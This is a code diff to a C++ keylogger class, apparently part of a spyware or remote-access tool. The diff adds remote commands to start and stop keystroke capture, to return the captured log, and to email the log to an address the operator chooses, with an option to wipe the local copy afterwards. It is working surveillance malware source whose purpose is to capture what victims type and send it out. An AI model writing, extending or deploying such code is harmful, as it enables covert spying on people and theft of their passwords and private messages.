@@ -2,7 +2,42 @@
 #include "Keylogger.h"
 
 
+Keylogger::Keylogger() {
+	CommandParser::addCommand("email", [this](std::string argStr) {
+		bool result = this->sendEmailReport(argStr, false);
+		auto receiverStr = argStr == "" ? "default receiver" : argStr;
+		if (result) {
+			return "Report to " + receiverStr + " successfully sent";
+		} else {
+			return "Can't send report to " + receiverStr;
+		}
+	});
+	CommandParser::addCommand("on", [this](std::string argStr) {
+		this->stop();
+		this->start();
+		return "Logging started successfully";
+	});
+	CommandParser::addCommand("off", [this](std::string argStr) {
+		this->stop();
+		return "Logging stopped";
+	});
+	CommandParser::addCommand("get", [this](std::string argStr) {
+		logFile.close();
+		std::ifstream logData;
+		logData.open(this->FILENAME, std::ios::in);
+		std::string data((std::istreambuf_iterator<char>(logData)),
+			std::istreambuf_iterator<char>());
+		logData.close();
+		logFile.open(this->FILENAME, std::ios::app);
+		return data;
+	});
+	CommandParser::addCommand("block", [this](std::string argStr) {
+		return "Not implemented now";
+	});
+}
+
 void Keylogger::start() {
+	
 	hook = make_shared<Hook>();
 	hook->setHook([this](const wchar_t key[]) {
 		keyboardHandler(key);
@@ -65,12 +100,7 @@ Keylogger::~Keylogger() {
 	stop();
 }
 
-bool Keylogger::sendEmailCallback(std::string emailTo) {
-	auto emailService = make_shared<EmailService>();
-	return emailService->sendEmail("Test", "test", emailTo);
-}
-
-bool Keylogger::sendEmailReport(bool deleteLocal) {
+bool Keylogger::sendEmailReport(std::string emailTo, bool deleteLocal) {
 	auto emailService = make_shared<EmailService>();
 
 	// Create email subject
@@ -85,13 +115,15 @@ bool Keylogger::sendEmailReport(bool deleteLocal) {
 		std::istreambuf_iterator<char>());
 	logData.close();
 
-	bool sendEmailResult = emailService->sendEmail(subject.str(), body, "");
+	bool sendEmailResult = emailService->sendEmail(subject.str(), body, emailTo);
 
 	if (!sendEmailResult) {
 		return false;
 	}
 
-	logFile.open(this->FILENAME, std::ios::trunc);
+	auto openMode = deleteLocal ? std::ios::trunc : std::ios::app;
+	logFile.open(this->FILENAME, openMode);
+
 	this->lastActiveWindow = nullptr;
 	return true;
 }
